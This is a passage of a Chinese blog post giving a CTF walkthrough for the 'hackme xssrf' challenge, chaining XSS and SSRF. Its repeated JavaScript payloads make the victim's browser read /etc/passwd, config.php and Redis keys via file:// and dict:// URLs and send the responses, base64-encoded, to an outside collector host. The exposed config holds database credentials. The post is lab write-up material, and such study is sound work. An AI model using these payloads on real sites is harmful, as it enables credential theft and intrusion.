href=&quot;index.php&quot;&gt;XSSRF&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">  &lt;ul class=&quot;navbar-nav&quot;&gt;</span><br><span class="line">    &lt;li class=&quot;nav-item&quot;&gt;</span><br><span class="line">      &lt;a class=&quot;nav-link&quot; href=&quot;sendmail.php&quot;&gt;Send Mail&lt;/a&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;nav-item&quot;&gt;</span><br><span class="line">      &lt;a class=&quot;nav-link&quot; href=&quot;mailbox.php&quot;&gt;Mailbox&lt;/a&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;nav-item&quot;&gt;</span><br><span class="line">      &lt;a class=&quot;nav-link&quot; href=&quot;sentmail.php&quot;&gt;Sent Mail&lt;/a&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;nav-item&quot;&gt;</span><br><span class="line">      &lt;a class=&quot;nav-link&quot; href=&quot;setadmin.php&quot;&gt;Set Admin&lt;/a&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;nav-item&quot;&gt;</span><br><span class="line">      &lt;a class=&quot;nav-link&quot; href=&quot;request.php&quot;&gt;Send Request&lt;/a&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">  &lt;/ul&gt;</span><br><span class="line"></span><br><span class="line">  &lt;ul class=&quot;navbar-nav ml-auto&quot;&gt;</span><br><span class="line">    &lt;li class=&quot;nav-item&quot;&gt;</span><br><span class="line">      &lt;span class=&quot;navbar-text&quot;&gt;Hello, admin (Administrator)&lt;/span&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;nav-item&quot;&gt;</span><br><span class="line">      &lt;a class=&quot;nav-link&quot; href=&quot;logout.php&quot;&gt;Logout&lt;/a&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">  &lt;/ul&gt;</span><br><span class="line">&lt;/nav&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      &lt;form action=&quot;/request.php&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;form-group&quot;&gt;</span><br><span class="line">          &lt;label for=&quot;url&quot;&gt;URL&lt;/label&gt;</span><br><span class="line">          &lt;textarea name=&quot;url&quot; class=&quot;form-control&quot; id=&quot;url&quot; aria-describedby=&quot;url&quot; placeholder=&quot;URL&quot; rows=&quot;10&quot;&gt;&lt;/textarea&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">        &lt;button class=&quot;btn btn-primary&quot;&gt;Send Request&lt;/button&gt;</span><br><span class="line">      &lt;/form&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>先用Ajax对setadmin.php发起请求：</p>
+<pre><code>xmlhttp=new XMLHttpRequest();
+xmlhttp.onreadystatechange=function()
+{
+    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)
+    {
+        document.location=&apos;http://101.132.41.135:1262/?&apos;+btoa(xmlhttp.responseText);
+    }
+}
+xmlhttp.open(&quot;POST&quot;,&quot;setadmin.php&quot;,true);
+xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);
+xmlhttp.send(&quot;username=dropsec&quot;);</code></pre><p>结果打到的页面显示说<code>This user is already a admin.</code>，，，</p>
+<p>那就对request.php发起请求，可以看到表单name为url，试探是不是ssrf：</p>
+<pre><code>xmlhttp=new XMLHttpRequest();
+xmlhttp.onreadystatechange=function()
+{
+    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)
+    {
+       document.location=&apos;http://101.132.41.135:1262/?&apos;+btoa(xmlhttp.responseText);
+    }
+}
+    xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);
+    xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);
+    xmlhttp.send(&quot;url=file:///etc/passwd&quot;);</code></pre><p>得到的页面显示出了<code>/etc/passwd</code>的内容</p>
+<p><img src="https://imgur.com/aD1UnDR.png" alt></p>
+<p>接下来尝试获取<code>config.php</code>内容，这里需要猜测网站根目录：</p>
+<pre><code>Apache /var/wwww/html
+Nginx /usr/local/nginx/html</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp=new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=function()</span><br><span class="line">&#123;</span><br><span class="line">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">    &#123;</span><br><span class="line">       document.location=&apos;http://101.132.41.135:1262/?&apos;+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);</span><br><span class="line">    xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">    xmlhttp.send(&quot;url=file:///var/www/html/config.php&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>得到flag，并且得到下一个flag的提示：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// database config</span></span><br><span class="line">define(<span class="string">'DB_USER'</span>, <span class="string">'xssrf'</span>);</span><br><span class="line">define(<span class="string">'DB_PASS'</span>, <span class="string">'xssrfmeplz'</span>);</span><br><span class="line">define(<span class="string">'DB_HOST'</span>, <span class="string">'host=localhost'</span>);</span><br><span class="line">define(<span class="string">'DB_NAME'</span>, <span class="string">'xssrf'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// redis config</span></span><br><span class="line">define(<span class="string">'REDIS_HOST'</span>, <span class="string">'localhost'</span>);</span><br><span class="line">define(<span class="string">'REDIS_PORT'</span>, <span class="number">25566</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// define flag</span></span><br><span class="line">define(<span class="string">'FLAG'</span>, <span class="string">'FLAG&#123;curl -v -o flag --next flag://in-the.redis/the?port=25566&amp;good=luck&#125;'</span>);</span><br><span class="line"></span><br><span class="line">$c_hardness = <span class="number">5</span>; <span class="comment">// how many proof of work leading zeros</span></span><br></pre></td></tr></table></figure>
+
+<p>使用<code>dict</code>或<code>gopher</code>协议来获取redis信息：</p>
+<pre><code>xmlhttp=new XMLHttpRequest();
+xmlhttp.onreadystatechange=function()
+{
+    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)
+    {
+       document.location=&apos;http://101.132.41.135:1262/?&apos;+btoa(xmlhttp.responseText);
+    }
+}
+    xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);
+    xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);
+    xmlhttp.send(&quot;url=dict://127.0.0.1:25566/KEYS *&quot;);</code></pre><p>得到如下关键信息：</p>
+<pre><code>-ERR Syntax error, try CLIENT (LIST | KILL ip:port | GETNAME | SETNAME connection-name)
+
+*1
+
+$4
+
+flag
+
++OK</code></pre><p>有了键名称，接下来获取值：</p>
+<pre><code>xmlhttp=new XMLHttpRequest();
+xmlhttp.onreadystatechange=function()
+{
+    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)
+    {
+       document.location=&apos;http://101.132.41.135:1262/?&apos;+btoa(xmlhttp.responseText);
+    }
+}
+    xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);
+    xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);
+    xmlhttp.send(&quot;url=dict://127.0.0.1:25566/GET flag&quot;);</code></pre><p>本以为能直接获取到flag，但报错了：</p>
+<pre><code>WRONGTYPE Operation against a key holding the wrong kind of value</code></pre><p>说值的类型错误，那就查看flag的类型：</p>
+<pre><code>xmlhttp=new XMLHttpRequest();
+xmlhttp.onreadystatechange=function()
+{
+    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)
+    {
+       document.location=&apos;http://101.132.41.135:1262/?&apos;+btoa(xmlhttp.responseText);
+    }
+}
+    xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);
+    xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);
+    xmlhttp.send(&quot;url=dict://127.0.0.1:25566/TYPE flag&quot;);</code></pre><p>得到类型list，关于redis的list，有以下简单说明：</p>
+<p> Redis列表是简单的字符串列表，按照插入顺序排序。你可以添加一个元素到列表的头部（左边）或者尾部（右边） </p>
+<p> 一个列表最多可以包含 232 - 1 个元素 (4294967295, 每个列表超过40亿个元素)。 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">redis 127.0.0.1:6379&gt; LPUSH runoobkey redis</span><br><span class="line">(integer) 1</span><br><span class="line">redis 127.0.0.1:6379&gt; LPUSH runoobkey mongodb</span><br><span class="line">(integer) 2</span><br><span class="line">redis 127.0.0.1:6379&gt; LPUSH runoobkey mysql</span><br><span class="line">(integer) 3</span><br><span class="line">redis 127.0.0.1:6379&gt; LRANGE runoobkey 0 10</span><br><span class="line"></span><br><span class="line">1) &quot;mysql&quot;</span><br><span class="line">2) &quot;mongodb&quot;</span><br><span class="line">3) &quot;redis&quot;</span><br></pre></td></tr></table></figure>
+
+<p>查看flag列表长度：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp=new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=function()</span><br><span class="line">&#123;</span><br><span class="line">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">    &#123;</span><br><span class="line">       document.location=&apos;http://101.132.41.135:1262/?&apos;+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);</span><br><span class="line">    xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">    xmlhttp.send(&quot;url=dict://127.0.0.1:25566/LLEN flag&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>得到长度53</p>
+<p>最后查看flag列表的值：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp=new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=function()</span><br><span class="line">&#123;</span><br><span class="line">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">    &#123;</span><br><span class="line">       document.location=&apos;http://101.132.41.135:1262/?&apos;+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);</span><br><span class="line">    xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">    xmlhttp.send(&quot;url=dict://127.0.0.1:25566/LRANGE flag 0 53&quot;);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;&amp;rcub;</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;t</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;i</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;o</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;l</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;p</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;x</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;e</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine; </span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;o</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;t</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine; </span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;y</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;s</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;a</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;e</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine; </span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;s</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;i</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine; </span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;n</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;o</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;i</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;t</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;a</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;c</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;i</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;t</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;n</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;e</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;h</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;t</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;u</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;a</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine; </span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;t</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;u</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;o</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;h</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;t</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;i</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;w</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine; </span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;s</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;i</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;d</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;e</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;R</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;&amp;lbrace;</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;G</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;A</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;L</span><br><span class="line">&amp;NewLine;&amp;dollar;1</span><br><span class="line">&amp;NewLine;F</span><br></pre></td></tr></table></figure>
+
+<p>写脚本:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f = open(<span class="string">'str.txt'</span>, <span class="string">'r'</span>).read()</span><br><span class="line"></span><br><span class="line">f = f.replace(<span class="string">'&amp;NewLine;'</span>, <span class="string">''</span>)</span><br><span class="line">f = f.replace(<span class="string">'&amp;dollar;1'</span>, <span class="string">''</span>)</span><br><span class="line">f = f.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">print(f[::<span class="number">-1</span>])</span><br></pre></td></tr></table></figure>
+
+<p>得到flag：</p>
+<pre><code>FLAG{Redis without authentication is easy to exploit}</code></pre><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>XSS真是太强大了，看飘零大佬和N0rth3ty大佬的文章弄了整整一天才弄懂，收货颇丰！</p>
+
+      
+    </div>
+    
+    
+    
+
+  <div>
+    
+      ﻿<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+    
+  </div>
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.jpg" alt="gtfly 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/aipay.jpg" alt="gtfly 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    gtfly
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yoursite.com/2019/07/25/XSS && SSRF/" title="XSS　&&　SSRF">http://yoursite.com/2019/07/25/XSS && SSRF/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/24/浏览器解析机制与XSS向量编码/" rel="next" title="浏览器解析机制与XSS向量编码">
+                <i class="fa fa-chevron-left"></i> 浏览器解析机制与XSS向量编码
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">gtfly</p>
+              <p class="site-description motion-element" itemprop="description">轻描时光漫长低唱语焉不详.</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">156</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://ctf.bugku.com/login?next=challenges" title="Bugku" target="_blank">Bugku</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://new.bugku.com/" title="new Bugku" target="_blank">new Bugku</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.linkedbyx.com/home" title="X计划平台" target="_blank">X计划平台</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.shiyanbar.com/ctf/practice" title="实验吧" target="_blank">实验吧</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ctf.jasec.cn/index.php?page=login" title="Jactf" target="_blank">Jactf</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.jarvisoj.com/login" title="Javis" target="_blank">Javis</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://cgctf.nuptsast.com/challenges#Web" title="CGctf" target="_blank">CGctf</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://xz.aliyun.com/" title="先知社区" target="_blank">先知社区</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://ctf.ssleye.com/" title="ctf在线工具" target="_blank">ctf在线工具</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://ctf.194nb.com/" title="aman ctf在线工具" target="_blank">aman ctf在线工具</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.ctfwp.com/" title="ctfwp" target="_blank">ctfwp</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://wangchangze.github.io/" title="wcz" target="_blank">wcz</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://skysec.top/" title="一叶飘零" target="_blank">一叶飘零</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.leavesongs.com/" title="离别歌" target="_blank">离别歌</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.daokers.com/" title="金刀客" target="_blank">金刀客</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#HTML-DOM-Document对象"><span class="nav-number">1.</span> <span class="nav-text">HTML DOM Document对象</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS平台搭建"><span class="nav-number">2.</span> <span class="nav-text">XSS平台搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS-Payload"><span class="nav-number">3.</span> <span class="nav-text">XSS Payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hackme-xssrf"><span class="nav-number">4.</span> <span class="nav-text">hackme xssrf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#小结"><span class="nav-number">5.</span> <span class="nav-text">小结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        ﻿<div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="heart">
+    <i class="fa fa-heart" aria-hidden="true"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">gtfly</span>
+
+ <span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+ <script>
+    var now = new Date(); 
+    function createtime() { 
+        var grt= new Date("07/16/2018 12:49:00");//此处修改你的建站时间或者网站上线时间 
+        now.setTime(now.getTime()+250); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
